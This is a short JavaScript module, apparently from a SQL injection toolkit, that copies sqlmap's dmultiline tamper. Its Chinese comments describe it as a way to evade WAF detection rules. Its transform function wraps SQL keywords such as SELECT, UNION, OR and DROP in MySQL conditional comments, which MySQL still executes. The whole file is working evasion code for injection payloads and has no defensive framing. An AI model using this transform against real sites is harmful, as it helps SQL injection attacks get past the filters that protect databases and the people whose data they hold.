// 多行注释包裹：将 SQL 表达式用多行注释包裹，绕过 WAF 检测规则（对标 sqlmap dmultiline.py）
// 利用 /*!...*/ 注释内的语句在 MySQL 中仍会被执行
export const dmultiline = {
  name: 'dmultiline',
  description: '用多行注释包裹 SQL 表达式，利用 MySQL 条件注释绕过 WAF',
  transform(payload, ctx) {
    const src = String(payload ?? '');
    // 包覆 SELECT/UNION/AND/OR 等关键字
    return src.replace(/\b(SELECT|UNION|AND|OR|WHERE|FROM|ORDER\s+BY|GROUP\s+BY|HAVING|LIMIT|OFFSET|INSERT|UPDATE|DELETE|INTO|VALUES|SET|CREATE|DROP|ALTER|EXEC|EXECUTE)\b/gi, '/*!$1*/');
  },
};
export default dmultiline;